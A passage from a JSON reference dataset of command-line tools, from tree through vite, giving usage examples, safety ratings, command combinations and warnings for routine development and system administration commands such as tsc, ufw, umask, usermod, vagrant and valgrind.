        "commands": "tree -I 'node_modules|.git' -o project_structure.md",
        "explanation": "Generate project structure excluding common directories",
        "title": "tree |"
      },
      {
        "scenario": "Find large directory hierarchies",
        "commands": "tree -d -L 3 / | grep -E '^.{50,}'",
        "explanation": "Show deep directory paths longer than 50 characters",
        "title": "tree | grep"
      }
    ],
    "relatedCommands": [
      {
        "name": "ls",
        "relationship": "alternative",
        "reason": "ls -R shows recursive listing, tree shows hierarchical view"
      },
      {
        "name": "find",
        "relationship": "similar",
        "reason": "find can show directory structure but tree is more visual"
      },
      {
        "name": "du",
        "relationship": "combo",
        "reason": "Combine tree structure with du for size information"
      }
    ],
    "warnings": [
      "Can produce very long output on deep directory structures",
      "May not be installed by default on all systems",
      "Pattern matching options vary between versions"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/tree.1.html"
      },
      {
        "platform": "macos",
        "url": "http://mama.indstate.edu/users/ice/tree/"
      },
      {
        "platform": "generic",
        "url": "http://mama.indstate.edu/users/ice/tree/tree.1.html"
      }
    ],
    "distroNotes": {
      "linux": "Usually available in package repositories",
      "macos": "Install via Homebrew: brew install tree",
      "windows": "Available in some Git installations or WSL"
    }
  },
  {
    "name": "tsc",
    "subtitle": "TypeScript Compiler",
    "description": "TypeScript compiler for type checking and JavaScript generation",
    "examples": [
      "tsc  # Compile using tsconfig.json configuration",
      "tsc app.ts  # Compile single TypeScript file to JavaScript",
      "tsc --watch  # Recompile automatically when files change",
      "tsc --noEmit  # Check types without generating JavaScript files",
      "tsc --init  # Generate tsconfig.json with default settings",
      "tsc --target ES2020 app.ts  # Compile to specific ECMAScript version",
      "tsc --sourceMap  # Generate source map files for debugging"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "tsc [options] [files...]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development workflow",
        "commands": "tsc --watch --preserveWatchOutput --pretty",
        "explanation": "Watch mode with clean output formatting",
        "title": "tsc"
      },
      {
        "scenario": "CI type checking",
        "commands": "tsc --noEmit --skipLibCheck",
        "explanation": "Fast type checking for continuous integration",
        "title": "tsc"
      }
    ],
    "relatedCommands": [
      {
        "name": "node",
        "relationship": "combo",
        "reason": "Node.js runs the compiled JavaScript output"
      },
      {
        "name": "eslint",
        "relationship": "combo",
        "reason": "ESLint can lint TypeScript code"
      },
      {
        "name": "webpack",
        "relationship": "combo",
        "reason": "Webpack can use ts-loader for TypeScript"
      }
    ],
    "warnings": [
      "tsconfig.json affects entire compilation behavior",
      "Type checking vs JavaScript generation are separate concerns",
      "Module resolution can be complex in monorepos"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.typescriptlang.org/docs/"
      },
      {
        "platform": "macos",
        "url": "https://www.typescriptlang.org/docs/"
      },
      {
        "platform": "windows",
        "url": "https://www.typescriptlang.org/docs/"
      },
      {
        "platform": "generic",
        "url": "https://www.typescriptlang.org/docs/handbook/compiler-options.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "tuned",
    "subtitle": "Tuned",
    "description": "Dynamic adaptive system tuning daemon",
    "examples": [
      "tuned-adm list  # Show all available tuning profiles",
      "tuned-adm active  # Display currently active tuning profile",
      "sudo tuned-adm profile throughput-performance  # Switch to high-throughput performance profile",
      "tuned-adm recommend  # Get recommended tuning profile for system",
      "sudo tuned-adm off  # Disable all tuning and restore defaults",
      "tuned-adm verify  # Verify that current profile is applied correctly"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "tuned-adm [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Performance optimization workflow",
        "commands": "tuned-adm recommend && sudo tuned-adm profile throughput-performance && tuned-adm verify",
        "explanation": "Get recommendation, apply performance profile, verify",
        "title": "tuned && sudo && tuned"
      }
    ],
    "relatedCommands": [
      {
        "name": "sysctl",
        "relationship": "alternative",
        "reason": "Manual kernel parameter tuning"
      }
    ],
    "warnings": [
      "Profiles may conflict with manual tuning",
      "Changes persist across reboots"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/tuned-adm.8.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ufw",
    "subtitle": "Uncomplicated Firewall",
    "description": "Uncomplicated Firewall - simplified iptables management",
    "examples": [
      "sudo ufw enable  # Enable UFW firewall",
      "sudo ufw status verbose  # Show detailed firewall status and rules",
      "sudo ufw allow ssh  # Allow SSH connections (port 22)",
      "sudo ufw allow 8080/tcp  # Allow TCP connections on port 8080",
      "sudo ufw allow from 192.168.1.0/24  # Allow all traffic from specific subnet",
      "sudo ufw delete 3  # Delete firewall rule number 3"
    ],
    "platform": [
      "linux"
    ],
    "category": "security",
    "safety": "dangerous",
    "syntaxPattern": "ufw [options] command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Web server firewall setup",
        "commands": "sudo ufw reset && sudo ufw default deny incoming && sudo ufw default allow outgoing && sudo ufw allow ssh && sudo ufw allow 'Apache Full' && sudo ufw enable",
        "explanation": "Reset firewall, set defaults, allow SSH and Apache, enable firewall",
        "title": "sudo && sudo && sudo && sudo && sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "iptables",
        "relationship": "alternative",
        "reason": "UFW is a frontend for iptables"
      }
    ],
    "warnings": [
      "UFW is a frontend to iptables",
      "Application profiles simplify common configurations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://manpages.ubuntu.com/manpages/focal/man8/ufw.8.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ulimit",
    "subtitle": "User Limits",
    "description": "Set or display user resource limits",
    "examples": [
      "ulimit -a  # Display all current resource limits",
      "ulimit -n 4096  # Set maximum open file descriptors to 4096",
      "ulimit -m 1048576  # Limit memory usage to 1GB (in KB)",
      "ulimit -c unlimited  # Allow unlimited core dump file size",
      "ulimit -n  # Show current file descriptor limit",
      "ulimit -t 300  # Limit CPU time to 300 seconds"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "ulimit [options] [limit]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development environment setup",
        "commands": "ulimit -n 8192 && ulimit -c unlimited && ulimit -a",
        "explanation": "Increase file descriptors, enable core dumps, show all limits",
        "title": "ulimit && ulimit && ulimit"
      }
    ],
    "relatedCommands": [
      {
        "name": "systemctl",
        "relationship": "alternative",
        "reason": "systemd can set service limits"
      },
      {
        "name": "prlimit",
        "relationship": "alternative",
        "reason": "More advanced resource limit management"
      }
    ],
    "warnings": [
      "Changes only affect current shell session",
      "Hard limits cannot be increased without privileges"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/bash.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "umask",
    "subtitle": "user mask",
    "description": "Set default file and directory creation permissions",
    "examples": [
      "umask  # Display current umask setting in octal format",
      "umask 077  # New files/directories only accessible by owner (no group/other access)",
      "umask 022  # Owner has full access, group/others have read access",
      "umask -S  # Display permissions that will be granted (not masked)",
      "umask 002; touch newfile; umask 022  # Change umask for one command then restore"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "shell",
    "safety": "safe",
    "syntaxPattern": "umask [mode]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Set umask in shell profile",
        "commands": "echo 'umask 022' >> ~/.bashrc && source ~/.bashrc",
        "explanation": "Make umask setting permanent for all new shells",
        "title": "echo >> && source"
      },
      {
        "scenario": "Test umask effect",
        "commands": "umask && touch testfile && ls -l testfile && rm testfile",
        "explanation": "See how current umask affects new file permissions",
        "title": "umask && touch && ls && rm"
      }
    ],
    "relatedCommands": [
      {
        "name": "chmod",
        "relationship": "related",
        "reason": "Changes existing permissions while umask sets defaults"
      },
      {
        "name": "touch",
        "relationship": "test",
        "reason": "Create files to test umask effects"
      },
      {
        "name": "mkdir",
        "relationship": "test",
        "reason": "Create directories to test umask effects"
      }
    ],
    "warnings": [
      "umask subtracts from default permissions (777 for dirs, 666 for files)",
      "umask is a shell builtin, settings are per-session",
      "Execute bit is never set on files regardless of umask"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man2/umask.2.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/umask.html"
      },
      {
        "platform": "generic",
        "url": "https://pubs.opengroup.org/onlinepubs/009695399/utilities/umask.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "umount",
    "subtitle": "Unmount",
    "description": "Unmount mounted filesystems",
    "examples": [
      "sudo umount /mnt/usb  # Unmount filesystem mounted at /mnt/usb",
      "sudo umount /dev/sdb1  # Unmount filesystem on device /dev/sdb1",
      "sudo umount -f /mnt/usb  # Force unmount even if filesystem is busy",
      "sudo umount -l /mnt/usb  # Detach filesystem immediately, cleanup when not busy",
      "sudo umount -a  # Unmount all filesystems listed in /etc/mtab"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "system",
    "safety": "caution",
    "syntaxPattern": "umount [options] device|mountpoint",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Safe USB removal",
        "commands": "sync && sudo umount /mnt/usb && sudo eject /dev/sdb",
        "explanation": "Sync data, unmount, and eject USB device safely",
        "title": "sync && sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "mount",
        "relationship": "combo",
        "reason": "mount and umount are complementary operations"
      },
      {
        "name": "sync",
        "relationship": "recommended",
        "reason": "sync ensures data is written before unmounting"
      }
    ],
    "warnings": [
      "'Device or resource busy' error means files are still open",
      "lsof or fuser can help identify processes using the filesystem",
      "Always sync before unmounting to ensure data integrity"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/umount.8.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/umount.html"
      },
      {
        "platform": "windows",
        "url": "Different approach (right-click eject)"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "uname",
    "subtitle": "Unix name",
    "description": "Display system information",
    "examples": [
      "uname -a  # Display kernel name, version, architecture, and more",
      "uname -r  # Show just the kernel release version",
      "uname -m  # Display machine hardware architecture (x86_64, arm64, etc.)",
      "uname -s  # Display kernel name (Linux, Darwin, etc.)"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "uname [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "System identification for scripts",
        "commands": "echo \"Running on $(uname -s) $(uname -r) ($(uname -m))\"",
        "explanation": "Create system identification string",
        "title": "echo"
      },
      {
        "scenario": "Check compatibility before install",
        "commands": "uname -m | grep -q 'x86_64' && echo 'Compatible' || echo 'Not compatible'",
        "explanation": "Verify system architecture compatibility",
        "title": "uname | grep && echo || echo"
      }
    ],
    "relatedCommands": [
      {
        "name": "lscpu",
        "relationship": "combo",
        "reason": "Detailed CPU information"
      },
      {
        "name": "hostnamectl",
        "relationship": "similar",
        "reason": "System hostname and related information"
      },
      {
        "name": "cat /etc/os-release",
        "relationship": "combo",
        "reason": "Detailed OS distribution information"
      }
    ],
    "warnings": [
      "uname -a may expose sensitive system information",
      "Output format varies slightly between operating systems",
      "Some options may not be available on all systems"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/uname.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/uname.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/uname-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL"
    }
  },
  {
    "name": "uniq",
    "subtitle": "unique",
    "description": "Report or omit repeated lines",
    "examples": [
      "sort file.txt | uniq  # Remove consecutive duplicate lines (requires sorted input)",
      "sort data.txt | uniq -c  # Show count of how many times each line appears",
      "sort file.txt | uniq -d  # Display only lines that appear more than once",
      "sort file.txt | uniq -u  # Display only lines that appear exactly once",
      "sort file.txt | uniq -i  # Treat upper and lower case as the same"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "uniq [options] [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find most common log entries",
        "commands": "sort access.log | uniq -c | sort -nr | head -10",
        "explanation": "Show top 10 most frequent log entries",
        "title": "sort | uniq | sort | head"
      },
      {
        "scenario": "Compare two files for common lines",
        "commands": "cat file1.txt file2.txt | sort | uniq -d",
        "explanation": "Find lines that appear in both files",
        "title": "cat | sort | uniq"
      }
    ],
    "relatedCommands": [
      {
        "name": "sort",
        "relationship": "combo",
        "reason": "uniq requires sorted input to work properly"
      },
      {
        "name": "comm",
        "relationship": "similar",
        "reason": "Compare sorted files line by line"
      },
      {
        "name": "awk",
        "relationship": "alternative",
        "reason": "Can deduplicate without requiring sorted input"
      }
    ],
    "warnings": [
      "Input must be sorted for uniq to work correctly",
      "Only removes consecutive duplicate lines",
      "Use sort -u as alternative for unsorted input"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/uniq.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/uniq.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/uniq-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL or Git Bash"
    }
  },
  {
    "name": "units",
    "subtitle": "Units",
    "description": "Unit conversion calculator",
    "examples": [
      "units  # Start interactive unit conversion session",
      "units '5 feet' 'meters'  # Convert 5 feet to meters",
      "units 'tempF(70)' 'tempC'  # Convert 70°F to Celsius",
      "units '150 pounds' 'kg'  # Convert 150 pounds to kilograms",
      "units '60 mph' 'km/hr'  # Convert 60 mph to km/h",
      "units --help  # Show help and available unit categories"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "units [from-unit] [to-unit]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Recipe conversion",
        "commands": "units '2 cups' 'ml' && units '350 tempF' 'tempC'",
        "explanation": "Convert recipe measurements and temperature",
        "title": "units && units"
      }
    ],
    "relatedCommands": [
      {
        "name": "bc",
        "relationship": "complementary",
        "reason": "bc does calculations, units does conversions"
      }
    ],
    "warnings": [
      "Extensive database of units and conversions",
      "Supports complex unit expressions",
      "May not be installed by default on all systems"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnu.org/software/units/"
      },
      {
        "platform": "macos",
        "url": "https://www.gnu.org/software/units/"
      },
      {
        "platform": "windows",
        "url": "Not typically available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "unity",
    "subtitle": "Unity Game Engine",
    "description": "Unity game engine command line interface",
    "examples": [
      "unity -batchmode -quit -projectPath /path/to/project -buildTarget Android -executeMethod BuildScript.Build  # Builds Unity project in batch mode targeting Android platform using custom build script",
      "unity -batchmode -quit -projectPath /path/to/project -runTests -testPlatform EditMode  # Executes Unity tests in Edit Mode without opening the editor",
      "unity -batchmode -quit -projectPath /path/to/project -importPackage /path/to/package.unitypackage  # Imports Unity package into project in batch mode",
      "unity -createProject /path/to/new/project  # Creates a new Unity project at the specified path"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "unity [options] -projectPath [path] [command]",
    "prerequisites": [
      "unity-editor"
    ],
    "commandCombinations": [
      {
        "scenario": "Build and test project",
        "commands": "unity -batchmode -quit -projectPath /path/to/project -runTests -testPlatform EditMode && unity -batchmode -quit -projectPath /path/to/project -buildTarget Android -executeMethod BuildScript.Build",
        "explanation": "Runs tests first, then builds project for Android if tests pass",
        "title": "unity && unity"
      },
      {
        "scenario": "Import package and build",
        "commands": "unity -batchmode -quit -projectPath /path/to/project -importPackage /path/to/package.unitypackage && unity -batchmode -quit -projectPath /path/to/project -buildTarget StandaloneWindows64 -executeMethod BuildScript.Build",
        "explanation": "Imports package and immediately builds project for Windows",
        "title": "unity && unity"
      }
    ],
    "relatedCommands": [
      {
        "name": "unity-hub",
        "relationship": "manager",
        "reason": "Unity Hub manages Unity installations and projects"
      },
      {
        "name": "msbuild",
        "relationship": "underlying",
        "reason": "Unity uses MSBuild for compiling C# scripts on Windows"
      },
      {
        "name": "blender",
        "relationship": "complement",
        "reason": "Blender is commonly used to create 3D assets for Unity projects"
      }
    ],
    "warnings": [
      "Project must exist and be valid Unity project",
      "Build scripts must be implemented in project for custom builds",
      "Batch mode requires -quit flag to properly exit",
      "License activation required for non-personal licenses"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.unity3d.com/Manual/CommandLineArguments.html"
      },
      {
        "platform": "macos",
        "url": "https://docs.unity3d.com/Manual/CommandLineArguments.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.unity3d.com/Manual/CommandLineArguments.html"
      },
      {
        "platform": "generic",
        "url": "https://docs.unity3d.com/Manual/EditorCommandLineArguments.html"
      }
    ],
    "distroNotes": {
      "windows": "Full Unity Editor and command line tools available",
      "macos": "Full Unity Editor and command line tools available",
      "linux": "Limited Unity Editor support, build tools available"
    }
  },
  {
    "name": "unzip",
    "subtitle": "unzip",
    "description": "Extract files from ZIP archives",
    "examples": [
      "unzip package.zip  # Extract all files to current directory",
      "unzip archive.zip -d /target/path/  # Extract files to specified directory",
      "unzip -l package.zip  # Show files in archive with sizes and dates",
      "unzip archive.zip '*.txt' 'config/*'  # Extract only text files and config directory",
      "unzip -t package.zip  # Verify archive is not corrupted without extracting",
      "unzip -o archive.zip  # Extract and overwrite existing files automatically"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "unzip [options] <archive> [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Safely extract to new directory",
        "commands": "mkdir extracted && unzip -j archive.zip -d extracted/",
        "explanation": "Create directory and extract files without folder structure",
        "title": "mkdir && unzip"
      },
      {
        "scenario": "Extract and show progress",
        "commands": "unzip -v package.zip | head -20",
        "explanation": "Verbose extraction showing file details",
        "title": "unzip | head"
      }
    ],
    "relatedCommands": [
      {
        "name": "zip",
        "relationship": "opposite",
        "reason": "zip creates archives, unzip extracts them"
      },
      {
        "name": "7z",
        "relationship": "alternative",
        "reason": "7z can also handle ZIP files with more options"
      },
      {
        "name": "tar",
        "relationship": "similar",
        "reason": "Both extract archives, different formats"
      }
    ],
    "warnings": [
      "May overwrite files without warning unless -n flag used",
      "Path traversal vulnerability with untrusted archives",
      "Case sensitivity handling varies by platform"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/unzip.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/unzip.html"
      },
      {
        "platform": "windows",
        "url": "Built into Windows Explorer or command line"
      },
      {
        "platform": "generic",
        "url": "http://www.info-zip.org/mans/unzip.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "uptime",
    "subtitle": "uptime",
    "description": "Show system uptime and load averages",
    "examples": [
      "uptime  # Show how long system has been running and load averages",
      "uptime -p  # Display uptime in human-readable format",
      "uptime -s  # Display when system was last booted"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "uptime [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "System status summary",
        "commands": "uptime && free -h && df -h",
        "explanation": "Quick system overview: uptime, memory, and disk usage",
        "title": "uptime && free && df"
      },
      {
        "scenario": "Monitor load over time",
        "commands": "watch -n 10 uptime",
        "explanation": "Monitor load averages every 10 seconds",
        "title": "watch"
      }
    ],
    "relatedCommands": [
      {
        "name": "top",
        "relationship": "similar",
        "reason": "Shows load averages along with process information"
      },
      {
        "name": "w",
        "relationship": "similar",
        "reason": "Shows uptime and logged-in users"
      },
      {
        "name": "vmstat",
        "relationship": "combo",
        "reason": "More detailed system performance statistics"
      }
    ],
    "warnings": [
      "Load average > CPU cores usually indicates high system load",
      "Load averages are for 1, 5, and 15 minute periods",
      "High load doesn't always mean CPU bottleneck"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/uptime.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/uptime.html"
      },
      {
        "platform": "generic",
        "url": "https://www.cyberciti.biz/faq/show-linux-system-uptime/"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL or PowerShell equivalent"
    }
  },
  {
    "name": "uptrace",
    "subtitle": "Uptrace APM",
    "description": "Open-source APM and distributed tracing tool built with OpenTelemetry",
    "examples": [
      "uptrace serve --config=uptrace.yml  # Start Uptrace server with configuration",
      "uptrace migrate --config=uptrace.yml  # Run database migrations",
      "uptrace user create --config=uptrace.yml --email=user@example.com  # Create new user account",
      "uptrace user reset-password --config=uptrace.yml --email=user@example.com  # Reset user password"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "uptrace [command] [flags]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Initial setup",
        "commands": "uptrace migrate --config=uptrace.yml && uptrace user create --config=uptrace.yml --email=admin@example.com",
        "explanation": "Setup database and create admin user",
        "title": "uptrace && uptrace"
      }
    ],
    "relatedCommands": [
      {
        "name": "jaeger",
        "relationship": "alternative",
        "reason": "Both provide distributed tracing"
      },
      {
        "name": "opentelemetry-collector",
        "relationship": "combo",
        "reason": "Receives data from OpenTelemetry collector"
      }
    ],
    "warnings": [
      "Requires ClickHouse database for storage",
      "Configuration includes database settings",
      "Data retention settings affect storage usage"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://uptrace.dev/docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "usermod",
    "subtitle": "User Modify",
    "description": "Modify user account properties and group memberships",
    "examples": [
      "sudo usermod -aG docker username  # Add user to docker group while preserving other groups",
      "sudo usermod -s /bin/zsh username  # Change default shell for user",
      "sudo usermod -L username  # Lock user account by disabling password",
      "sudo usermod -U username  # Unlock previously locked user account",
      "sudo usermod -d /new/home/path -m username  # Move user home directory to new location",
      "sudo usermod -e 2024-12-31 username  # Set account to expire on specific date"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "security",
    "safety": "caution",
    "syntaxPattern": "usermod [options] username",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete user migration",
        "commands": "sudo usermod -d /new/home -m username && sudo usermod -s /bin/bash username",
        "explanation": "Move home directory and change shell",
        "title": "sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "useradd",
        "relationship": "similar",
        "reason": "Creates new users"
      },
      {
        "name": "groupmod",
        "relationship": "similar",
        "reason": "Modifies group properties"
      }
    ],
    "warnings": [
      "Moving home directory may break applications",
      "User must not be logged in during home directory changes"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/usermod.8.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "vagrant",
    "subtitle": "Vagrant",
    "description": "Tool for building and managing virtual machine environments",
    "examples": [
      "vagrant init ubuntu/bionic64  # Create Vagrantfile with Ubuntu 18.04 base box",
      "vagrant up  # Create and configure VM according to Vagrantfile",
      "vagrant ssh  # Connect to running VM via SSH",
      "vagrant suspend  # Save VM state and stop execution",
      "vagrant destroy  # Stop and delete VM and associated resources",
      "vagrant status  # Display current state of VM",
      "vagrant reload  # Restart VM with updated Vagrantfile settings"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "vagrant [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development environment setup",
        "commands": "vagrant init ubuntu/bionic64 && vagrant up && vagrant ssh",
        "explanation": "Initialize, start, and connect to development VM",
        "title": "vagrant && vagrant && vagrant"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker",
        "relationship": "alternative",
        "reason": "Both provide isolated development environments"
      },
      {
        "name": "virtualbox",
        "relationship": "combo",
        "reason": "VirtualBox is common provider for Vagrant"
      }
    ],
    "warnings": [
      "Requires virtualization provider (VirtualBox, VMware, etc.)",
      "Vagrantfile defines VM configuration",
      "Box images can be large downloads"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.vagrantup.com/docs"
      },
      {
        "platform": "macos",
        "url": "https://www.vagrantup.com/docs"
      },
      {
        "platform": "windows",
        "url": "https://www.vagrantup.com/docs"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "valgrind",
    "subtitle": "Valgrind",
    "description": "Memory debugging and profiling tool suite",
    "examples": [
      "valgrind --leak-check=full ./myprogram  # Run program with full memory leak detection",
      "valgrind --tool=memcheck ./myprogram  # Check for memory errors like buffer overflows",
      "valgrind --tool=callgrind ./myprogram  # Profile program performance and call graph",
      "valgrind --tool=cachegrind ./myprogram  # Profile cache usage and memory access patterns",
      "valgrind --tool=massif ./myprogram  # Profile heap memory usage over time"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "valgrind [options] program [program-options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete memory analysis",
        "commands": "valgrind --leak-check=full --show-leak-kinds=all --track-origins=yes ./myprogram",
        "explanation": "Comprehensive memory debugging with detailed output",
        "title": "valgrind"
      }
    ],
    "relatedCommands": [
      {
        "name": "gdb",
        "relationship": "complementary",
        "reason": "gdb provides interactive debugging, valgrind automatic analysis"
      },
      {
        "name": "strace",
        "relationship": "complementary",
        "reason": "strace shows system calls, valgrind analyzes memory"
      }
    ],
    "warnings": [
      "Significantly slows down program execution",
      "May produce false positives with some libraries",
      "Requires debug symbols for best results"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://valgrind.org/docs/manual/"
      },
      {
        "platform": "macos",
        "url": "https://valgrind.org/docs/manual/"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "vector",
    "subtitle": "Vector Data Pipeline",
    "description": "High-performance observability data pipeline for logs and metrics",
    "examples": [
      "vector --config vector.toml  # Start Vector with configuration file",
      "vector validate --config vector.toml  # Validate Vector configuration",
      "vector test --config vector.toml tests/  # Run tests against Vector configuration",
      "vector generate --fragment source-file  # Generate configuration fragment",
      "vector list  # List available Vector components"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "vector [subcommand] [flags]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development workflow",
        "commands": "vector validate --config vector.toml && vector test --config vector.toml tests/",
        "explanation": "Validate and test configuration",
        "title": "vector && vector"
      }
    ],
    "relatedCommands": [
      {
        "name": "fluentd",
        "relationship": "alternative",
        "reason": "Alternative data collection and routing"
      },
      {
        "name": "logstash",
        "relationship": "alternative",
        "reason": "Alternative log processing pipeline"
      }
    ],
    "warnings": [
      "Configuration syntax is TOML-based",
      "Components are sources, transforms, and sinks",
      "Performance depends on pipeline design"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://vector.dev/docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "vim",
    "subtitle": "vi improved",
    "description": "Powerful text editor with modal interface",
    "examples": [
      "vim config.txt  # Open file for editing in vim",
      "vim newfile.py  # Create and edit new file",
      "vim +25 script.sh  # Open file and jump to line 25",
      "vim -R important.conf  # Open file in read-only mode to prevent accidental changes",
      "vim file1.txt file2.txt  # Open multiple files, switch with :next and :prev"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "vim [options] [file...]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Quick edit and commit",
        "commands": "vim README.md && git add README.md && git commit -m 'Update README'",
        "explanation": "Edit file then commit changes to git",
        "title": "vim && git && git"
      },
      {
        "scenario": "Edit files found by grep",
        "commands": "grep -l 'TODO' *.py | xargs vim",
        "explanation": "Open all Python files containing TODO comments",
        "title": "grep | xargs"
      }
    ],
    "relatedCommands": [
      {
        "name": "nano",
        "relationship": "alternative",
        "reason": "Simpler editor for beginners"
      },
      {
        "name": "emacs",
        "relationship": "alternative",
        "reason": "Different philosophy text editor"
      },
      {
        "name": "vscode",
        "relationship": "alternative",
        "reason": "Modern GUI editor with vim plugins"
      }
    ],
    "warnings": [
      "Press 'i' to enter insert mode, 'Esc' to exit",
      "Save with ':w', quit with ':q', force quit ':q!'",
      "Can be overwhelming for new users"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/vim.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/vim.html"
      },
      {
        "platform": "generic",
        "url": "https://www.vim.org/docs.php"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "vite",
    "subtitle": "Vite (French for 'quick')",
    "description": "Fast build tool for modern web development",
    "examples": [
      "vite  # Start fast development server with HMR",
      "vite build  # Create optimized production bundle",
      "vite preview  # Serve production build locally for testing",
      "vite optimize  # Pre-bundle dependencies for faster startup",
